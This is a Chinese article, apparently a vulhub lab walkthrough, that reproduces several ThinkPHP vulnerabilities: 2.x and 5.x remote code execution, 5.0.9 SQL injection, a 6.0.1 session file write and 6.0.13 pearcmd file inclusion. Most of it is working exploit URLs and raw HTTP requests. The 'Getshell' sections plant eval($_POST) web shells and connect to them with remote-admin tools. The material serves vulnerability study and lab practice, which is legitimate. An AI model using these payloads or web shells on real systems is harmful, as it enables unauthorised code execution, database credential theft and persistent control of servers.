<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A23P3EWTSTLkL5N0xXoIWg)

ThinkPHP
========

TP - 2.x-RCE
------------

ThinkPHP 2.x 版本中，使用`preg_replace`的`/e`模式匹配路由：

```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));

```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。

环境搭建

执行如下命令启动 ThinkPHP 2.1 的 Demo 应用：

```
docker compose up -d

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ3gQoJtare29b3tTicHUwy0cTZWw8YYDsXDqxfD6YntNDBla4xbK0PkQ/640?wx_fmt=png)

环境启动后，访问`http://your-ip:8080/Index/Index`即可查看到默认页面。

漏洞复现

直接访问`http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZRTRic7qlDBr20bmjFBdia9UIibvIIuJEk6aZUkXOj6W3TP682zrMHMRiaQ/640?wx_fmt=png)

TP - 2.x-RCE x Getshell
-----------------------

下面给出一个能够直接菜刀连接的 payload：

```
/index.php?s=a/b/c/${@print(eval($_POST[1]))}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9hTYhaB93G1IdAknHdfUth0d3fK2CDolPsTHjM4pTyzicklH3YAlGSQ/640?wx_fmt=png)

使用蚁剑连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZDgyVncRwApR9o4Age9sibukfqhJoibSoiaV3Gw4sr2jqJ0Tw4E464C10Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZbPoicjtLy9CemN3x0LdXJbTZdAAESeiavwmpTr8XibKojPNGFQPQf02WA/640?wx_fmt=png)

TP - 5.0.9-SQLi
---------------

启动后，访问`http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZTpOnKUqDfLX2JVgXydagX5icicpvoo0ucpicia5ITVDuYB57qRGBsCsmHw/640?wx_fmt=png)

访问`http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZwqT96cSbzy2atWS3bPUdL5RSybiaLCAhhvW2uALYiaN752vic1PWADoicA/640?wx_fmt=png)

找到数据库账号密码，敏感信息泄露。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZHoaRypthYNQGNozVrmouRV4Tia19Kuf5OjqG4PCj7HKibM5ictq2ZxoHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZCE3urDGG9FLibsCIIsPAERWDpB3gWOdKC0L0P2ePiceAcCus16rpCdRg/640?wx_fmt=png)

TP - 5.0.22/5.1.29-RCE
----------------------

ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

控制器名未过滤导致 rce

`function`为反射调用的函数，`vars[0]`为传入的回调函数，`vars[1][]`为参数为回调函数的参数

运行 ThinkPHP 5.0.20 版本：

```
docker compose up -d

```

环境启动后，访问`http://your-ip:8080`即可看到 ThinkPHP 默认启动页面。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZyia2vwtUvMlFbREqzn1JEicJrL5ORSWrjXN2qBH1ia8iclEVOw4gvOwwkA/640?wx_fmt=png)

直接访问`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZjqagAqltSrGlNCWZ7Kiae6nQvFy5zMJIy66q5DYXEMr16VvLic7IV1JQ/640?wx_fmt=png)

```
http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZtB1LhzTY6qiaQQ3MDLApV1edGIYf7FGHNAGF7Ht8bP5r8ULvq0otSGg/640?wx_fmt=png)

TP - 5.0.22/5.1.29-RCE x Getshell
---------------------------------

```
http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST[1]);?>' > shell.php

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZtqfnRlFBv3OUVswnxhibZiaN8oSWN3I0lQImNO2ImqCGP3EYWbVRYZCw/640?wx_fmt=other)

TP - 5.0.23-RCE
---------------

ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。

在 vulhub 中开启即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZpAic0SZw2127EkJJhhOibmTb0G4FDeIX83Ts8uic9c1LHpvZbZoicyPaWg/640?wx_fmt=png)

页面访问

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZbwlZsoZoVZMPOjp2UIU8k3Gw4kCNgajcPJ5ib0NZ41Cv1KqmCVzu6Sg/640?wx_fmt=png)

抓包更改为 POST

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZsiaxGEDhkM4xllRESwX8bic4q3tPHmIJRKn6oWicic68ZV3ibhibSswJuLhA/640?wx_fmt=png)

```
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZyibhpMSuqrISOzM2OYVNHyGGXZjVzDjyKUpjDMzrRz01HfFwicVC8ibLw/640?wx_fmt=png)

TP - 5.0.23-RCE x Getshell
--------------------------

```
POST /index.php?s=captcha HTTP/1.1
Host: 192.168.66.132:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_lang=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php @eval($_POST[1]);?>' > shell.php

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZwHJdaOJpU2cJNBKTiahL0rNceGuicX4ePxSdE6r6SrIS6CT9ZHjYeqJQ/640?wx_fmt=png)

响应 500，实际上上传成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZVtJ2h7Ew6v8jPNaEqtzf9icf2zCd0wYnmY4jb75TQwcqwGc48XZJnIA/640?wx_fmt=png)

访问浏览器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZECSLMTNyqw5iaUTkYSBYG90OEBicTnTOs4I7Jt6DAE2p53wvSzMeY6hQ/640?wx_fmt=png)

蚁剑连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZWtzBBxA5KJevUT0BlNJ8z2EpEBsrCrRTribzNB0ptHBIsZmLBoiaKAnw/640?wx_fmt=png)

TP - 6.0.1 Session 任意文件操作
-------------------------

使用 Kali 来一步一步部署 6.0 的 tp

```
# 安装compose并放到bin下
curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
# 换源
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
# 安装thinkphp6.0
cd /var/www/html
composer create-project topthink/think tp6 6.0.1 --prefer-dist

# 依赖
sudo apt-get install php-mbstring
sudo apt-get install php-dom

# 启动
cd tp6
php think run -p 8000
# ！访问 ip:8000

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZLNf3QUKfbzPtF5BicetBCYA5lN5hcAh31QzP1Gxyuz2BK0EckNsPvxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9CwibCkjVtiaWs1On5vZKVY3JVtwvt7WUpOrPzZhnDiceFw4SMZZpC9bQ/640?wx_fmt=png)

更改版本，使用 composer update 即可更新版本, “^6.0.0” 改为 "6.0.1"

修改两个文件，首先修改 app/controller/Index.php

```
<?php
namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
   public function index()
  {
       # + 加上这三行
       $a = isset($_GET['a']) && !empty($_GET['a']) ? $_GET['a'] : '';
       $b = isset($_GET['b']) && !empty($_GET['b']) ? $_GET['b'] : '';
       session($a,$b);
       return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6<br/><span style="font-size:30px">13载初心不改 - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
  }

   public function hello($name = 'ThinkPHP6')
  {
       return 'hello,' . $name;
  }
}

```

开启 session 且写入的 session 可控

/tp6/app/middleware.php 文件开启 session

去掉注释 session 的 //

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ6szzcpyE5k2xUUVfTHHjQr4ZWia6Sb43FwVu0YHXNoqXzJf35arb1ZA/640?wx_fmt=png)

> 遇到的一些小问题，kali 下载 php7.4 一直缺少依赖，72,73 都安装成功，但是 composer 必须 7.4 及以上，这就很烦，我干脆干掉它，直接找文件改代码，等于 7.3。没想到成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZSvSCia9a4JoHEreTCT95ra0jI5TBrvicUmoD5noEFRtwbNwLIVc9nBVg/640?wx_fmt=png)

本来是 70400，再次执行 php7.3 think run 就 ok 了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ3jTYgbk1YGKaiaT6TPmpM21ibSeicmQ9kkE59uqX9FJWT7wOMdNic75EXA/640?wx_fmt=png)

方法一

```
GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1
Host: 192.168.66.132:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1234567890123456789012345678.php;
Upgrade-Insecure-Requests: 1



```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZzes8ZibZP3MEQsibol44ywrTSqJfyT7seBahuxQIpXHu2jPbuhwnAQIw/640?wx_fmt=png)

1234567890123456789012345678.php

```
http://192.168.66.132:8001/runtime/session/sess_1234567890123456789012345678.php

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZibXFs1scfUGax1kf8MTCl6qBKBchFZp8SzicbdiaJ0bmzDQbKPqLf8DXw/640?wx_fmt=png)

访问没成功，emmm

方法二

```
GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1
Host: 192.168.66.132:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=/../../../public/aaaaaaaaaaa.php;
Upgrade-Insecure-Requests: 1



```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZeHHnT4Qich7RhrLHJgic2N5Y875JEg4x9qdXFoavzHGbpRpkSqUVE06g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZHjpFOaHwhXosYHiaSNDmlptrIPA3VNwhSpR1wbVXgiaibJvXP0fjiaVYpw/640?wx_fmt=png)

TP - 6.0.13-Pearcmd x EXP
-------------------------

ThinkPHP 是一个在中国使用较多的 PHP 框架。在其 6.0.13 版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用`lang`参数来包含任意 PHP 文件。

虽然只能包含本地 PHP 文件，但在开启了`register_argc_argv`且安装了 pcel/pear 的环境下，可以包含`/usr/local/lib/php/pearcmd.php`并写入任意文件。

Payload:

```
GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../usr/local/lib/php/pearcmd
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZDE6HEfiaEnPvRJXTKDCqHt9PvpQkMtPClic0TxlSzS4hRCeCRXLhfomw/640?wx_fmt=png)

查看

```
docker exec -it 20c58ef53381 /bin/bash

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZfNHsxMKGsouaYLx9A6gIVOdgfAbe2mU7xBmhMAraocVRfLpzKuXl1Q/640?wx_fmt=png)

包含 hello.php

```
GET /public/index.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../tmp/hello
Cookie: think_lang=zh-cn
Connection: close

```

浏览器访问

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZjx0j9DaxPV1FpuBsoNVbwvg2pOfuHaM1C3icTrqWyyvlPB2z3ggic84w/640?wx_fmt=png)

TP - 6.0.13-Pearcmd x GET
-------------------------

需要根据实际情况改变文件名称，写不进去可以考虑多加点../

```
GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZQ2aEkcPo3DTJzEqUJTY3gnzD66rVOaiatDngn8wibVQuo0v0zw9omljw/640?wx_fmt=png)

查看是否成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ2OF5ialAH8VPOt0IvFVCiacGibWU1U3sr9zfTqXoTLVaNIG92uju7rYtg/640?wx_fmt=png)

文件包含读取

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ2EsdMEFLjUAKKUMXvY1m649Q1uUwNNqiakeQM1ZLTLd1kibkf1SQx71w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZCCsUgNOsIUib4ovibpuP9ibO1SV5hQObIAiag28kYIIzTGNiamWucSdOAbw/640?wx_fmt=png)

TP - 6.0.13-Pearcmd x HEADER
----------------------------

```
GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/2.php HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZhvCYQxDbjkjWrNzyLqJaygibtpyL3icYj8XQhzicgQIPqrJngct4fialsQ/640?wx_fmt=png)

查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZIM0DbOkicYz65J2zbMhatwOQFw2ia10Uh5Lb4KlDXIEnDGLH79NTTRSQ/640?wx_fmt=png)

文件包含查看

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/2 HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ9Z2tsLhLMiaTicQCDgzHNDayA9dicsibvmJ2Lsx2au5TyngzthHvrQMoNA/640?wx_fmt=png)

TP - 6.0.13-Pearcmd x COOKIES
-----------------------------

```
GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/3.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZP5FMqbHPia8DYzeyqLBPRNp1Pu4lnEGTsef29fxfnibWenVL39icCGkyw/640?wx_fmt=png)

查看是否成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ7LZHMHh1ZTZmKwIzybNCsbAtns3uGs3Kc17jFsflhIK1RDc8SojPBg/640?wx_fmt=png)

文件包含查看

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/3 HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZuJia12HWYynmlaQNu3FrbSDmqLvCoCRd2vtQRBYCcU242uGT3vMUTxQ/640?wx_fmt=png)

TP - 6.0.13-Pearcmd x Getshell
------------------------------

```
GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZiczxib4rJAueA1icKnGKXnrp87ooYhedakfzqMvgTI6zJ96KStzBB4agg/640?wx_fmt=png)

文件包含访问

```
GET /public/index.php?lang=../../../../../../../../../../../../var/www/html/shell HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

页面访问

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZSUWQHub2lmmYcLN4VyZMR7gicFK20ZVKrjYk8pIn2MjG2Wc7R1C1VlQ/640?wx_fmt=png)

使用蚁剑连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzPkFicicgsMDWdcDu9haZmGibZ1D8VxEg3DicCibf91ERCO0RWyOjxJZq410tqrKFZGaHnuNvUVekFtSsQ/640?wx_fmt=png)